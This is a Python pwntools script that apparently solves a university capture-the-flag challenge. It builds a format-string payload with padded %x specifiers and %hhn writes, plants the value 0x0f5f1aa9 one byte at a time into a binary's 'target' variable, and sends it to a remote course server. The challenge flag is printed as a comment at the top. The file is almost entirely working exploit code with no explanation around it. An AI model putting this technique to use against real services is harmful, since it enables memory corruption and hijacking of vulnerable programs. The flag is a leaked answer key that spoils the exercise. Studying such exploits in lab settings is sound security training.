# SSof{And_write_very_big_numbers}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22195

elf = ELF("bin")
target_address = elf.symbols['target']

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it

goal = 0x0f5f1aa9
msg = b""

msg += p32(target_address)
msg += p32(target_address+1)
msg += p32(target_address+2)
msg += p32(target_address+3)


## first byte
padding = str(0xa9-len(msg))
total_output = int(padding) + len(msg)
print(padding)
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%7$hhn"

## second byte
print()
padding = str((0x1a-total_output + 0x100)%0x100)
print(padding)
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%8$hhn"
total_output += int(padding)

## third byte
padding = str((0x5f-total_output + 0x100)%0x100)
print(padding)
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%9$hhn"
total_output += int(padding)

## four byte
padding = str((0x0f-total_output + 0x100)%0x100)
print(padding)
msg += b"%0"+ bytes(padding, "utf-8") + b"x"
msg += b"%10$hhn"
total_output += int(padding)

# msg = b"AAAA"*4
# msg += b".%08x" * 10

print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

print(s.recv())
# s.recvall()
# s.interactive()

